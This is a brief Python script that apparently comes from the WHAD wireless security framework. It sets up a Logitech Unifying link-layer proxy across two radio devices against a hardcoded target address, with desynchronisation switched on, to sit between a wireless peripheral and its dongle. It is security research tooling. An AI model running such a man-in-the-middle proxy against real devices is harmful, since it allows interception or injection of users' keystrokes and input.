from whad.unifying.tools.proxy import LinkLayerProxy
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
import sys, logging
#logging.basicConfig(level=logging.INFO)

if __name__ == '__main__':
    if len(sys.argv) >= 3:
        # Retrieve target interface
        interface1 = sys.argv[1]
        interface2 = sys.argv[2]
        try:
            dev1 = WhadDevice.create(interface1)
            dev2 = WhadDevice.create(interface2)
            target = "ca:e9:06:ec:a4"

            proxy = LinkLayerProxy(dev1, dev2, address=target, desync=True)
            proxy.start()
            while True:
                pass
        except (KeyboardInterrupt, SystemExit):
            dev1.close()
            dev2.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
    else:
        print('Usage: %s [device1] [device2]' % sys.argv[0])
